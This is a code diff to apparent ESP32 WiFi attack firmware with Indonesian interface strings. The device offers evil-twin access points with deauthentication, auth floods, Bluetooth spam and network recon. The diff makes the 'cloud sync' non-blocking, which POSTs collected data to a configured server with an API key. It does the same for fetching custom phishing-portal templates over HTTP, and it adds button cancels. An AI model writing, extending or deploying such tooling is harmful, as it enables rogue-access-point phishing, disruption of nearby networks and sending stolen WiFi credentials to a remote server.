@@ -57,6 +57,7 @@ enum State {
   AP_LIST_AUTH_FLOOD,
   AP_LIST_CSA,
   TEMPLATE_SELECT,
+  FETCH_TEMPLATE,
   DEAUTH_MENU,
   AUTH_FLOOD_RUNNING,
   EVIL_TWIN_RUNNING,
@@ -132,6 +133,17 @@ String g_customTemplate = "";
 bool useCustomTemplate = false;
 int cfg_autosync_min = 0;
 unsigned long lastAutoSync = 0;
+#define CLOUD_PHASE_IDLE 0
+#define CLOUD_PHASE_CONNECTING 1
+#define CLOUD_PHASE_SENDING 2
+#define CLOUD_PHASE_DONE 3
+int g_cloudPhase = CLOUD_PHASE_IDLE;
+unsigned long g_cloudTimer = 0;
+#define TPL_PHASE_IDLE 0
+#define TPL_PHASE_CONNECTING 1
+#define TPL_PHASE_GETTING 2
+int g_tplPhase = TPL_PHASE_IDLE;
+unsigned long g_tplTimer = 0;
 
 unsigned long evilTwinStartTime = 0;
 
@@ -1721,6 +1733,7 @@ String buildSyncJson() {
 }
 
 void startCloudSync() {
+  g_cloudPhase = CLOUD_PHASE_IDLE;
   tft.fillScreen(TFT_BLACK);
   drawHeader("CLOUD SYNC", TFT_DARKCYAN);
   tft.setTextFont(2);
@@ -1746,46 +1759,56 @@ void startCloudSync() {
   WiFi.mode(WIFI_STA);
   WiFi.begin(cfg_wifi_ssid.c_str(), cfg_wifi_pass.c_str());
   Serial.printf("[SYNC] Connect %s ...\n", cfg_wifi_ssid.c_str());
-  unsigned long t = millis();
-  while (WiFi.status() != WL_CONNECTED && millis() - t < 12000) {
-    delay(200);
-  }
-  if (WiFi.status() != WL_CONNECTED) {
-    Serial.println("[SYNC] GAGAL konek WiFi");
-    tft.setTextColor(TFT_RED, TFT_BLACK);
-    tft.setCursor(10, 105); tft.println("GAGAL konek WiFi");
-    delay(2000);
-    currentState = MAIN_MENU;
-    drawMainMenu();
-    return;
-  }
-
-  tft.setTextColor(TFT_GREEN, TFT_BLACK);
-  tft.setCursor(10, 105); tft.print("Connected. Mengirim...");
-
-  String json = buildSyncJson();
-  HTTPClient http;
-  http.begin(cfg_server_url);
-  http.addHeader("Content-Type", "application/json");
-  http.addHeader("X-API-Key", SYNC_API_KEY);
-  int code = http.POST(json);
-  String resp = http.getString();
-  http.end();
-  Serial.printf("[SYNC] HTTP %d: %s\n", code, resp.c_str());
-
-  tft.setTextColor(TFT_WHITE, TFT_BLACK);
-  tft.fillRect(0, 105, 240, 12, TFT_BLACK);
-  tft.setCursor(10, 105);
-  if (code == 200) { tft.setTextColor(TFT_GREEN, TFT_BLACK); tft.println("SUKSES kirim data"); }
-  else { tft.setTextColor(TFT_RED, TFT_BLACK); tft.println("FAIL HTTP " + String(code)); }
-
-  WiFi.disconnect();
-  WiFi.mode(WIFI_STA);
-  delay(2500);
-  currentState = MAIN_MENU;
-  drawMainMenu();
+  g_cloudPhase = CLOUD_PHASE_CONNECTING;
+  g_cloudTimer = millis();
 }
 
+void cloudSyncTick() {
+  if (g_cloudPhase == CLOUD_PHASE_CONNECTING) {
+    if (WiFi.status() == WL_CONNECTED) {
+      g_cloudPhase = CLOUD_PHASE_SENDING;
+      tft.setTextColor(TFT_GREEN, TFT_BLACK);
+      tft.setCursor(10, 105); tft.print("Connected. Mengirim...");
+      Serial.println("[SYNC] Connected");
+    } else if (millis() - g_cloudTimer > 12000) {
+      Serial.println("[SYNC] GAGAL konek WiFi");
+      tft.setTextColor(TFT_RED, TFT_BLACK);
+      tft.setCursor(10, 105); tft.println("GAGAL konek WiFi");
+      WiFi.disconnect();
+      WiFi.mode(WIFI_STA);
+      g_cloudPhase = CLOUD_PHASE_DONE;
+      g_cloudTimer = millis();
+    }
+  } else if (g_cloudPhase == CLOUD_PHASE_SENDING) {
+    String json = buildSyncJson();
+    HTTPClient http;
+    http.begin(cfg_server_url);
+    http.addHeader("Content-Type", "application/json");
+    http.addHeader("X-API-Key", SYNC_API_KEY);
+    http.setTimeout(6000);
+    int code = http.POST(json);
+    String resp = http.getString();
+    http.end();
+    Serial.printf("[SYNC] HTTP %d: %s\n", code, resp.c_str());
+
+    tft.setTextColor(TFT_WHITE, TFT_BLACK);
+    tft.fillRect(0, 105, 240, 12, TFT_BLACK);
+    tft.setCursor(10, 105);
+    if (code == 200) { tft.setTextColor(TFT_GREEN, TFT_BLACK); tft.println("SUKSES kirim data"); }
+    else { tft.setTextColor(TFT_RED, TFT_BLACK); tft.println("FAIL HTTP " + String(code)); }
+
+    WiFi.disconnect();
+    WiFi.mode(WIFI_STA);
+    g_cloudPhase = CLOUD_PHASE_DONE;
+    g_cloudTimer = millis();
+  } else if (g_cloudPhase == CLOUD_PHASE_DONE) {
+    if (millis() - g_cloudTimer > 2500) {
+      g_cloudPhase = CLOUD_PHASE_IDLE;
+      currentState = MAIN_MENU;
+      drawMainMenu();
+    }
+  }
+}
 void stopEvilTwin();
 
 void restoreOriginalApMac() {
@@ -1985,6 +2008,7 @@ bool detectPMFExact(const uint8_t* bssid, uint8_t channel) {
 
   unsigned long start = millis();
   while (!g_pmfFound && (millis() - start) < 1500) {
+    if (digitalRead(BTN_TOP) == LOW || digitalRead(BTN_BOTTOM) == LOW) break;
     delay(10);
   }
 
@@ -2178,8 +2202,18 @@ void handleAPListNavigation() {
   }
 }
 
-bool fetchCustomTemplate() {
-  if (cfg_template_url.length() == 0 || cfg_wifi_ssid.length() == 0) return false;
+void startFetchCustomTemplate() {
+  g_tplPhase = TPL_PHASE_IDLE;
+  if (cfg_template_url.length() == 0 || cfg_wifi_ssid.length() == 0) {
+    useCustomTemplate = false;
+    selectedTemplateIdx = 0;
+    currentState = EVIL_TWIN_RUNNING;
+    verifyAttempts = 0;
+    verifyState = 0;
+    startEvilTwinWithDeauth();
+    drawEvilTwinRunning(0);
+    return;
+  }
 
   tft.fillScreen(TFT_BLACK);
   drawHeader("AMBIL TEMPLATE", TFT_DARKCYAN);
@@ -2190,32 +2224,55 @@ bool fetchCustomTemplate() {
 
   WiFi.mode(WIFI_STA);
   WiFi.begin(cfg_wifi_ssid.c_str(), cfg_wifi_pass.c_str());
-  unsigned long t = millis();
-  while (WiFi.status() != WL_CONNECTED && millis() - t < 12000) {
-    delay(200);
-  }
-  if (WiFi.status() != WL_CONNECTED) {
-    WiFi.disconnect();
-    WiFi.mode(WIFI_STA);
-    return false;
-  }
+  g_tplPhase = TPL_PHASE_CONNECTING;
+  g_tplTimer = millis();
+}
 
-  HTTPClient http;
-  http.begin(cfg_template_url);
-  int code = http.GET();
-  if (code == 200) {
-    g_customTemplate = http.getString();
+void templateFetchTick() {
+  if (g_tplPhase == TPL_PHASE_CONNECTING) {
+    if (WiFi.status() == WL_CONNECTED) {
+      g_tplPhase = TPL_PHASE_GETTING;
+    } else if (millis() - g_tplTimer > 12000) {
+      WiFi.disconnect();
+      WiFi.mode(WIFI_STA);
+      useCustomTemplate = false;
+      selectedTemplateIdx = 0;
+      currentState = EVIL_TWIN_RUNNING;
+      verifyAttempts = 0;
+      verifyState = 0;
+      startEvilTwinWithDeauth();
+      drawEvilTwinRunning(0);
+      return;
+    }
+  } else if (g_tplPhase == TPL_PHASE_GETTING) {
+    HTTPClient http;
+    http.begin(cfg_template_url);
+    http.setTimeout(6000);
+    int code = http.GET();
+    bool ok = false;
+    if (code == 200) {
+      g_customTemplate = http.getString();
+      ok = g_customTemplate.length() > 0;
+    }
     http.end();
     WiFi.disconnect();
     WiFi.mode(WIFI_STA);
-    return g_customTemplate.length() > 0;
-  }
-  http.end();
-  WiFi.disconnect();
-  WiFi.mode(WIFI_STA);
-  return false;
-}
 
+    if (ok) {
+      selectedTemplateIdx = 5;
+      useCustomTemplate = true;
+    } else {
+      useCustomTemplate = false;
+      selectedTemplateIdx = 0;
+    }
+
+    currentState = EVIL_TWIN_RUNNING;
+    verifyAttempts = 0;
+    verifyState = 0;
+    startEvilTwinWithDeauth();
+    drawEvilTwinRunning(0);
+  }
+}
 void handleTemplateSelect() {
   if (digitalRead(BTN_TOP) == LOW) {
     delay(200);
@@ -2225,21 +2282,19 @@ void handleTemplateSelect() {
   if (digitalRead(BTN_BOTTOM) == LOW) {
     delay(200);
     if (templateSelection == 5) {
-      selectedTemplateIdx = 5;
-      useCustomTemplate = true;
-      if (!fetchCustomTemplate()) {
-        useCustomTemplate = false;
-        selectedTemplateIdx = 0;
-      }
+      currentState = FETCH_TEMPLATE;
+      startFetchCustomTemplate();
+      while (digitalRead(BTN_BOTTOM) == LOW) delay(50);
+      return;
     } else {
       selectedTemplateIdx = templateSelection;
       useCustomTemplate = false;
+      currentState = EVIL_TWIN_RUNNING;
+      verifyAttempts = 0;
+      verifyState = 0;
+      startEvilTwinWithDeauth();
+      drawEvilTwinRunning(0);
     }
-    currentState = EVIL_TWIN_RUNNING;
-    verifyAttempts = 0;
-    verifyState = 0;
-    startEvilTwinWithDeauth();
-    drawEvilTwinRunning(0);
   }
 }
 
@@ -3344,7 +3399,7 @@ void startNetworkRecon() {
       tft.setCursor(50, 64);
       tft.printf("%u/%u host:%u", (unsigned)scanned, (unsigned)total, (unsigned)g_reconHostCount);
     }
-    if (digitalRead(BTN_TOP) == LOW) {
+    if (digitalRead(BTN_TOP) == LOW || digitalRead(BTN_BOTTOM) == LOW) {
       delay(200);
       break;
     }
@@ -3605,6 +3660,7 @@ void loop() {
   if (currentState == MAIN_MENU) {
     if (cfg_autosync_min > 0 && (millis() - lastAutoSync) >= (unsigned long)cfg_autosync_min * 60000UL) {
       lastAutoSync = millis();
+      currentState = CLOUD_SYNC;
       startCloudSync();
     }
     if (digitalRead(BTN_TOP) == LOW) {
@@ -3745,6 +3801,16 @@ void loop() {
            currentState == RECON_AP_SELECT) {
     handleAPListNavigation();
   }
+  else if (currentState == FETCH_TEMPLATE) {
+    templateFetchTick();
+    if (currentState == FETCH_TEMPLATE && (digitalRead(BTN_TOP) == LOW || digitalRead(BTN_BOTTOM) == LOW)) {
+      delay(200);
+      WiFi.disconnect();
+      WiFi.mode(WIFI_STA);
+      currentState = TEMPLATE_SELECT;
+      drawTemplateSelect();
+    }
+  }
   else if (currentState == TEMPLATE_SELECT) {
     handleTemplateSelect();
   }
@@ -3800,6 +3866,17 @@ void loop() {
   else if (currentState == BT_SPAM) {
     if (digitalRead(BTN_TOP) == LOW || digitalRead(BTN_BOTTOM) == LOW) {
       delay(300); stopBTSpam(); currentState = MAIN_MENU; drawMainMenu();
+    }
+  }
+  else if (currentState == CLOUD_SYNC) {
+    cloudSyncTick();
+    if (currentState == CLOUD_SYNC && (digitalRead(BTN_TOP) == LOW || digitalRead(BTN_BOTTOM) == LOW)) {
+      delay(200);
+      WiFi.disconnect();
+      WiFi.mode(WIFI_STA);
+      g_cloudPhase = CLOUD_PHASE_IDLE;
+      currentState = MAIN_MENU;
+      drawMainMenu();
     }
   }
   else if (currentState == WEB_REMOTE) {
